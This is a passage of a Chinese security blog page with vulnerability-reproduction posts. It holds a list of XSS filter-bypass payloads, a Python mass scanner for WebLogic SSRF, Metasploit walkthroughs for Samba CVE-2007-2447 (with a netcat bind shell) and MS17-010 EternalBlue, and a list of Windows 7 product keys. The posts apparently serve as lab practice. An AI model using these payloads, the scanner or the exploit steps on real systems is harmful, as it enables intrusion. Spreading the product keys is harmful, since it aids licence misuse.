error:</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1))//&quot;&gt;</span><br><span class="line">&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0</span><br><span class="line">&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=alert(1)//&apos;&gt;</span><br><span class="line"></span><br><span class="line">[!] special tags parsing issues, from: http://html5sec.org/#html</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">[!] fuzzing tips: </span><br><span class="line">&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:alert(1)&gt;XXX&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">[!] utf-7 bom</span><br><span class="line">+/v8</span><br><span class="line">+/v9</span><br><span class="line">+/v+</span><br><span class="line">+/v/</span><br><span class="line"></span><br><span class="line">[!] html5sec.org</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;frameset onload=alert(1)&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt; // by evilcos</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;body onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`*=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line"></span><br><span class="line">&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line"></span><br><span class="line">&lt;div&gt; &lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;base href=&quot;javascript:\ &lt;/div&gt;&lt;div id=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:/&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:\&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base/href=javascript:/&gt;&lt;a href=/*&apos;&quot;+-/%~.,()^&amp;$#@!*/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞复现/Weblogic-SSRF-漏洞复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞复现/Weblogic-SSRF-漏洞复现/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>关于SSRF漏洞的原理以及利用已经记录过了，可以访问 查看，这次复现一下这个漏洞</p>
<p>本次还是利用<code>vulhub</code>进行漏洞复现<hr></p>
<h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><blockquote>
<p>docker-compose build<br>docker-compose up -d</p>
</blockquote>
<p>访问<code>http://本地ip:7001/uddiexplorer/</code>，即可查看uddiexplorer应用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-68bb4fd2fdf2f855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<hr>

<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，提交参数值为<code>url:port</code>，根据返回错误不同，可对内网状态进行探测如端口开放状态等</p>
<ol>
<li><p>访问一个可以访问的<code>ip:port</code>，一般返回一个状态码，<code>The server at http://192.168.60.168:7001/ returned a 404 error code &amp;#40;Not Found&amp;#41;</code>如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-db3ef399b2fe3e0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
</li>
<li><p>访问一个不存在的端口，将返回<code>but could not connect over HTTP to server</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-ce451d10f52c5637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
</li>
<li>访问一个非http协议，则返回<code>did not have a valid SOAP content-type</code></li>
</ol>
<p><hr></p>
<h4 id="redis-反弹-shell"><a href="#redis-反弹-shell" class="headerlink" title="redis 反弹 shell"></a>redis 反弹 shell</h4><p><hr><br>附上大佬<code>weblogic ssrf</code>检测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line">class Weblogic_SSRF_Check(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    def check(self,domain,ip):</span><br><span class="line">        payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip)</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line"></span><br><span class="line">            m = re.search(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                mutex.acquire()</span><br><span class="line">                with open(&apos;ssrf.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    print &quot;%s has weblogic ssrf.&quot; % domain</span><br><span class="line">                    f.write(&quot;%s has weblogic ssrf.\n&quot; % domain)</span><br><span class="line">                mutex.release()</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def get_registry(self,domain):</span><br><span class="line">        payload = &apos;uddiexplorer/SetupUDDIExplorer.jsp&apos;</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line">            m = re.search(&apos;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                return m.group(1)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.queue.empty():</span><br><span class="line">            domain = self.queue.get()</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            print domain</span><br><span class="line">            mutex.release()</span><br><span class="line">            ip = self.get_registry(domain)</span><br><span class="line">            self.check(domain,ip)</span><br><span class="line"></span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;domain.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">    for x in xrange(1,50):</span><br><span class="line">        t = Weblogic_SSRF_Check(queue)</span><br><span class="line">        t.setDaemon(True)</span><br><span class="line">        t.start()</span><br><span class="line">    queue.join()</span><br></pre></td></tr></table></figure></p>
<p><hr><br>参考链接：<br><a href="http://wyb0.com/posts/weblogic-ssrf-check/" target="_blank" rel="noopener">http://wyb0.com/posts/weblogic-ssrf-check/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞复现/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞复现/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>usermap_script：CVE-2007-2447<br>Samba用户名映射脚本命令执行</p>
<h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中，导致允许远程命令执行。</p>
<h4 id="msf-中模块位置"><a href="#msf-中模块位置" class="headerlink" title="msf 中模块位置"></a>msf 中模块位置</h4><blockquote>
<p>exploit/multi/samba/usermap_script</p>
</blockquote>
<p>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。<br>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。<br>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>攻击机 kali<br>IP 192.168.195.133</p>
<p>靶机 Metasploitable_ubuntu<br>IP 192.168.195.132</p>
<ol>
<li>搜索有关<code>samba</code>漏洞的代码库<blockquote>
<p>search samba</p>
</blockquote>
</li>
<li>使用<code>usermap_script</code>代码<blockquote>
<p>use exploit/multi/samba/usermap_script</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8805e6ee37bebf29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
<ol start="3">
<li>查看攻击载荷 <blockquote>
<p>show payloads</p>
</blockquote>
</li>
</ol>
<p>并选择bind_netcat即使用netcat工具在渗透攻击成功后执行shell并通过netcat绑定在一个监听端口上</p>
<blockquote>
<p>set payload cmd/unix/bind_netcat</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-cf8879b9a08ad902.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
<ol start="4">
<li>查看参数配置<blockquote>
<p>show options</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7d20c70d09d1e160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
<ol start="5">
<li>设置目标<code>ip</code><blockquote>
<p>set RHOST 192.168.195.132</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b4e95900980507e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
<ol start="6">
<li>执行<code>exploit</code>成功获取靶机<code>shell</code><blockquote>
<p>exploit</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-926ca534e06b2225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞复现/MS17-010漏洞复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞复现/MS17-010漏洞复现/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><p>攻击机 kali<br>靶机 Windows7（需要关闭防火墙）</p>
<h4 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h4><ol>
<li>启动msf终端<blockquote>
<p>msfconsole</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-a40d5dc36622cf4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
<ol start="2">
<li>搜索与ms17-010漏洞有关的代码库<blockquote>
<p>search ms17_010</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-46c074bd09fb361d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
<ol start="3">
<li>使用<code>exp</code>代码<blockquote>
<p>use exploit/windows/smb/ms17_010_eternablue</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-368e43d7fde305bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
<ol start="4">
<li>显示代码参数选项<blockquote>
<p>show options</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-163127c878051cbc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
<ol start="5">
<li>设置目标IP地址<blockquote>
<p>set RHOST X.X.X.X</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-ff00c01330211dda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
<ol start="6">
<li>执行攻击代码<blockquote>
<p>exploit</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-32ee82b38b69d83d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
<p>成功拿到win7 shell</p>
<ul>
<li>附上制作 Windows 7 虚拟机需要的序列号(任选其一即可)<blockquote>
<p>KH2J9-PC326-T44D4-39H6V-TVPBY<br>TEP9Y-VCY3P-VVH3T-8XXCC-MF4YK<br>236TW-X7781-8MV9F-937GT-QVKBB<br>87VT2-FY2XW-F7K39-W3T8R-XMFGF<br>6K2KY-BFH24-PJW6W-9GK29-TMPWP<br>RHTBY-WWY6D-QJRJ9-JGQ3X-Q2289</p>
</blockquote>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">wcute</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">29</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wcute</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
